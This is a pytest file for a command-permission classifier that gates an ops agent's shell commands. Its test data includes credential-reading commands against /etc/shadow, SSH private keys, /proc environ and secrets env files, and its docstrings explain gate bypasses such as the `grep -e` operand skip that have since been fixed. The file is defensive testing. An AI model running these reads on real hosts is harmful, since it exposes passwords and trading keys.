    ],
)
def test_the_round_four_fixes_kept_their_true_positives(cmd, host):
    """Each fix was cut to the exact shape of its defect, and this is what that bought.

    `-o` admits `/dev/null` alone, so the dead-man liveness probe still runs; the format check
    grammars the ACTIONS rather than banning `json`, so the runbooks' labelled multi-selector
    formats still run; and the secret veto covers only heads that print file CONTENT, so `ls -la`
    still answers the permission check on the secrets file it names.
    """
    assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.AUTONOMOUS


@pytest.mark.parametrize(
    "cmd",
    [
        "docker restart al*",
        "docker stop *",
        "systemctl restart 'zcrypto-*'",
        "systemctl restart zcrypto-*",
        "systemctl stop 'zcrypto-*.service'",
    ],
)
def test_a_mutating_target_is_never_a_glob(cmd):
    """One token that expands to many is the same defect as `cat <secretdir>/*`, on the write side.

    A glob in a container or unit name turns one authorised telemetry restart into a mass one, and
    nothing downstream re-checks what it expanded to. Reads keep their patterns -- the exact-unit
    class is only on the mutating shapes -- so `systemctl list-timers 'zcrypto-*'` still runs.
    """
    assert ops_daily.classify_action(cmd, host="ops") is ops_daily.Tier.PREPARED


def test_the_read_patterns_the_exact_unit_class_must_not_break():
    assert ops_daily.classify_action("systemctl list-timers 'zcrypto-*'", host="ops") is ops_daily.Tier.AUTONOMOUS
    assert ops_daily.classify_action("systemctl list-units 'zcrypto-*.service' --all", host="ops") is ops_daily.Tier.AUTONOMOUS
    assert ops_daily.classify_action("systemctl restart alloy", host="ops") is ops_daily.Tier.AUTONOMOUS


@pytest.mark.parametrize(
    "cmd",
    [
        "sudo cat /proc/1234/environ",
        "cat /proc/self/environ",
        "grep -r KRAKEN /proc/",
        "cat /sys/class/net/eth0/address",
        "sudo cat /etc/systemd/system/zcrypto-engine.service",
        "cat /var/logsecret/keys.txt",
    ],
)
def test_a_read_safe_root_holds_only_what_was_checked(cmd):
    """`/proc/` and `/sys/` were listed as inert without checking, and `/proc/` is not inert.

    `cat /proc/<pid>/environ` prints a container's environment -- on the engine host the live Kraken
    trade key, the one read CLAUDE.md names outright. `/etc/systemd/` was equally speculative: a
    unit file can carry `Environment=` inline, so only journald's own config is listed. The last
    case pins the prefix boundary: a root ending in `/` cannot be widened by a sibling that merely
    starts with its letters.
    """
    assert ops_daily.classify_action(cmd, host="zcrypto") is ops_daily.Tier.PREPARED


@pytest.mark.parametrize(
    "cmd",
    [
        "grep -e KRAKEN /opt/zcrypto-capture/logship-secrets.env",
        "grep -e . /opt/zcrypto-capture/logship-secrets.env",
        "sudo grep -e x /home/deploy/.ssh/id_rsa",
        "grep -e X /etc/shadow",
        "grep -in -e ADMIN /etc/zcrypto-ops/alloy/alloy-secrets.env",
        # operand 0 is the secret and operand 1 is safe, so skipping operand 0 passed the command
        "grep -e X /etc/shadow /var/log/syslog",
        "grep --regexp=X /etc/shadow",
        "grep -ie X /etc/shadow",
    ],
)
def test_grep_e_does_not_turn_the_first_file_into_the_pattern(cmd):
    """The path check skips `grep`'s first operand as its pattern; `-e` moves the pattern elsewhere.

    With `-e` value-taking, `grep -e X /etc/shadow` left the FILE at operand 0, where the skip threw
    it away unchecked — and both seeded secrets printed. `-e` is a valueless short flag now, so the
    pattern is always positional. The skip is only ever sound while that stays true.
    """
    assert ops_daily.classify_action(cmd, host="zcrypto") is ops_daily.Tier.PREPARED


def test_the_greps_the_runbooks_actually_run():
    for cmd in (
        "grep -rE '^Storage=' /etc/systemd/journald.conf /etc/systemd/journald.conf.d/",
        "grep -A3 group_add /etc/zcrypto-ops/alloy/compose.yaml",
        "sudo docker logs grafana-alloy --since 1h 2>&1 | grep -iE 'collector|error'",
    ):
        assert ops_daily.classify_action(cmd, host="ops") is ops_daily.Tier.AUTONOMOUS, cmd


@pytest.mark.parametrize(
    "cmd",
    [
        "cat /etc/systemd/journald.conf.evil",
        "cat /etc/zcrypto-ops/alloy/compose.yamlxsecrets.env",
        "cat /etc/zcrypto-ops/alloy/compose.yaml.bak",
        "cat /etc/machine-id-backup/secrets",
    ],
)
def test_a_single_file_root_does_not_admit_names_that_extend_it(cmd):
    """The three file entries were matched by `startswith`, so any longer name read clean.

    Nothing on the fleet matched, which is what kept it latent — but `/etc/zcrypto-ops/alloy/` holds
    alloy-secrets.env beside the compose file it lists, so a `compose.yaml.bak` there would have been
    a door onto that directory. Files match exactly; only directory roots, all `/`-terminated, match
    by prefix.
    """
    assert ops_daily.classify_action(cmd, host="ops") is ops_daily.Tier.PREPARED


def test_the_exact_file_roots_still_read():
    for cmd in (
        "grep -rE '^Storage=' /etc/systemd/journald.conf /etc/systemd/journald.conf.d/",
        "grep -A3 group_add /etc/zcrypto-ops/alloy/compose.yaml",
        "cat /etc/machine-id",
    ):
        assert ops_daily.classify_action(cmd, host="ops") is ops_daily.Tier.AUTONOMOUS, cmd


def test_every_directory_read_root_ends_in_a_slash():
    """The split between prefix-matched dirs and exactly-matched files is only sound while it holds.

    A `_READ_SAFE_DIRS` entry added without its trailing slash silently becomes a prefix again, and
    admits every sibling whose name merely extends it — the defect the split was made to close. The
    comment above the constant says so; this asserts it.
    """
    assert all(root.endswith("/") for root in ops_daily._READ_SAFE_DIRS), ops_daily._READ_SAFE_DIRS
    assert not any(f.endswith("/") for f in ops_daily._READ_SAFE_FILES), ops_daily._READ_SAFE_FILES


def test_the_log_read_uses_lokis_query_path_not_prometheuss(monkeypatch):
    """Loki answers under `/loki/api/v1/query`; `/api/v1/query` is Prometheus's and 404s there.

    Measured against the live stack: the Prometheus spelling returned HTTP 404 and the Loki one
    returned 200 with series. The whole suite was green while the log plane had never worked once,
    because no test looked at the URL -- so this asserts the path, not the parse.
    """
    monkeypatch.delenv("GRAFANA_LOKI_DS_UID", raising=False)
    opener = _recording({"data": {"result": []}})
    ops_daily.read_logs("tok", window=DAY, opener=opener)
    assert len(opener.urls) == 1
    assert "/loki/api/v1/query" in opener.urls[0], opener.urls[0]
    assert "/uid/grafanacloud-logs/" in opener.urls[0], opener.urls[0]


def test_the_prometheus_reads_keep_the_prometheus_query_path():
    """The same proxy helper serves both datasources, so widening it for Loki must not move these."""
    opener = _recording({"data": {"result": []}})
    ops_daily.read_verdict("tok", opener=opener)
    assert opener.urls and all("/api/v1/query" in u and "/loki/" not in u for u in opener.urls), opener.urls
    assert all("/uid/grafanacloud-prom/" in u for u in opener.urls), opener.urls


@pytest.mark.parametrize(
    "exc",
    [
        TimeoutError("timed out"),
        ConnectionResetError("reset by peer"),
        http.client.RemoteDisconnected("closed without response"),
        http.client.IncompleteRead(b"half"),
        urllib.error.URLError("dns"),
        urllib.error.HTTPError("u", 502, "bad gateway", {}, None),
    ],
)
def test_a_transport_failure_is_an_unreadable_source_not_a_crash(exc):
    """urllib wraps OSError only around the REQUEST, so these escape a `URLError`-only catch.

    None of them can be produced by a fixture that returns a payload, which is why they survived
    every green run: they need a real network. Uncaught, the 03:00 pass dies with a traceback and
    Python exits 1 -- the ATTENTION code -- so an unreachable Grafana would have been reported as
    a fleet finding rather than as the unreadable source it is, inverting the module's contract.
    """
    for read, kwargs in (
        (ops_daily.read_logs, {"window": DAY}),
        (ops_daily.read_alerts, {"now": NOW, "window": DAY}),
        (ops_daily.read_deadmen, {}),
    ):
        result = read("tok", opener=_raises(exc), **kwargs)
        assert result.unreadable, f"{read.__name__} let {type(exc).__name__} escape"


def test_a_verdict_read_that_could_not_be_read_exits_2_not_1():
    """`read_verdict` reports through its checks, so its failures bypassed `Report.unreadable`.

    An isolated timeout on the verdict query alone therefore exited 1 -- ATTENTION -- which says a
    Grafana the pass could not reach is something wrong with the FLEET. The old assertion here was
    `all(ok is False)`, which a healthy empty result satisfies identically and so proved nothing;
    the `unreadable:` prefix is what distinguishes them.
    """
    checks = ops_daily.read_verdict("tok", opener=_raises(TimeoutError("timed out")))
    assert checks and all(c.value.startswith("unreadable:") for c in checks), checks
    report = ops_daily.build_report(
        alerts=ops_daily.AlertsRead(),
        logs=ops_daily.LogsRead(),
        deadmen=ops_daily.DeadmenRead(),
        verdict=checks,
        deploys=[],
        now=NOW,
    )
    assert report.unreadable, "a verdict the pass could not read is an unreadable SOURCE"
    assert report.exit_code == 2, report.exit_code


def test_a_healthy_but_empty_verdict_is_not_an_unreadable_source():
    """The true positive the old assertion could not tell apart: `(no series)` is a FAIL, not a gap."""
    checks = ops_daily.read_verdict("tok", opener=_canned({"data": {"result": []}}))
    report = ops_daily.build_report(
        alerts=ops_daily.AlertsRead(),
        logs=ops_daily.LogsRead(),
        deadmen=ops_daily.DeadmenRead(),
        verdict=checks,
        deploys=[],
        now=NOW,
    )
    assert not report.unreadable, report.unreadable
    assert report.exit_code == 1, report.exit_code


def test_a_shape_changed_payload_is_an_unreadable_source_not_a_crash():
    """A 200 whose body changed shape used to raise `KeyError` past the guard.

    Both parses now sit inside their try. Uncaught, each left the pass at exit 1 -- attention -- for
    a source it could not read, the same inversion as a transport failure one line earlier.
    """
    bad = {"data": {"result": [{"metric": {}, "vaIue": [0, "1"]}]}}
    assert ops_daily.read_logs("tok", window=DAY, opener=_canned(bad)).unreadable
    checks = ops_daily.read_verdict("tok", opener=_canned(bad))
    assert checks and all(c.value.startswith("unreadable:") for c in checks), checks


def test_a_vault_that_cannot_be_read_exits_2(monkeypatch, capsys):
    """The vault is a source too, and its failure is not an `OSError`.

    A locked GPG agent raises `CalledProcessError` -- a `SubprocessError` -- so `_UNREACHABLE` never
    covered it, and `main` resolved the token outside any handler. That exited 1 with a traceback:
    a credential the pass could not read, reported as a finding about the fleet.
    """

    def boom(*a, **k):
        raise subprocess.CalledProcessError(2, ["vault-pass.sh"])

    monkeypatch.setattr(ops_daily.grafana_auth, "vault_var", boom)
    assert ops_daily.main(["report"]) == 2
    assert "the vault could not be read" in capsys.readouterr().out


def test_a_bad_since_suffix_is_a_usage_error_not_a_traceback():
    assert ops_daily.main(["report", "--since", "24w"]) == 2
    assert ops_daily.main(["report", "--since", "abc"]) == 2
